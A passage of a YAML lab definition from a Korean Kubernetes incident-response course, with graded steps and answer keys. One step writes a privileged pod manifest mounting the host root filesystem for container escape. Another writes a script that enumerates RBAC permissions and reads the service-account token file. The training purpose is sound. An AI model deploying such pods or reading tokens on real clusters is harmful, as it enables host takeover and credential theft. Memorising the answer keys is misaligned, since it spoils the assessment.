lab_id: agent-ir-adv-nonai-week08
title: K8s Pod Escape + API 악용 IR (Non-AI)
version: nonai
course: agent-ir-adv-nonai
week: 8
description: privileged·hostPath·capability로 탈출. PSA restricted·Falco·NetworkPolicy 방어. 학생이 수동 수행·기록.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: privileged Pod 매니페스트 예시
  hint: 6단계 IR 중 공격 단계. target_vm=bastion.
  category: attack
  points: 9
  answer: "mkdir -p ~/w08 && cat > ~/w08/bad-pod.yaml <<'Y'\napiVersion: v1\nkind: Pod\nmetadata: {name:\
    \ bad-pod}\nspec:\n  containers:\n    - name: c\n      image: alpine\n      securityContext: {privileged:\
    \ true}\n      volumeMounts: [{name: host, mountPath: /host}]\n  volumes:\n    - name: host\n    \
    \  hostPath: {path: /}\nY\ncat ~/w08/bad-pod.yaml"
  answer_detail: '[공격] privileged+hostPath=완전 호스트 접근.'
  verify:
    type: output_contains
    expect: privileged
    field: stdout
    semantic:
      intent: '[공격] privileged Pod — cat > bad-pod.yaml: securityContext privileged true + hostPath /.
        완전 호스트 접근. MITRE T1611 Escape to Host.'
      success_criteria:
      - privileged 키워드
      - hostPath /
      - securityContext
      acceptable_methods:
      - privileged Pod
      - hostPID/hostNetwork
      - capabilities SYS_ADMIN
      negative_signs:
      - privileged 없음
      - hostPath 없음
      - YAML 아님
  target_vm: bastion
  script: "mkdir -p ~/w08 && cat > ~/w08/bad-pod.yaml <<'Y'\napiVersion: v1\nkind: Pod\nmetadata: {name:\
    \ bad-pod}\nspec:\n  containers:\n    - name: c\n      image: alpine\n      securityContext: {privileged:\
    \ true}\n      volumeMounts: [{name: host, mountPath: /host}]\n  volumes:\n    - name: host\n    \
    \  hostPath: {path: /}\nY\ncat ~/w08/bad-pod.yaml"
  risk_level: low
  bastion_prompt: ''
- order: 2
  instruction: kubectl 권한 열거 시뮬
  hint: 6단계 IR 중 공격 단계. target_vm=bastion.
  category: attack
  points: 10
  answer: 'cat > ~/w08/enum.sh <<''S''

    #!/bin/bash

    echo ''kubectl auth can-i --list''

    echo ''cat /var/run/secrets/kubernetes.io/serviceaccount/token''

    S

    cat ~/w08/enum.sh'
  answer_detail: '[공격] SA 토큰 + can-i.'
  verify:
    type: output_contains
    expect: can-i
    field: stdout
    semantic:
      intent: '[공격] kubectl 권한 열거 — cat > enum.sh: kubectl auth can-i --list + cat /var/run/secrets/.../token.
        SA 토큰 + can-i. MITRE T1613.'
      success_criteria:
      - can-i 키워드
      - serviceaccount/token
      - 권한 열거
      acceptable_methods:
      - kubectl auth
      - PACU k8s
      - kube-hunter
      negative_signs:
      - can-i 없음
      - token 경로 없음
      - 열거 없음
  target_vm: bastion
  script: 'cat > ~/w08/enum.sh <<''S''

    #!/bin/bash

    echo ''kubectl auth can-i --list''

    echo ''cat /var/run/secrets/kubernetes.io/serviceaccount/token''

    S

    cat ~/w08/enum.sh'
  risk_level: low
  bastion_prompt: ''
- order: 3
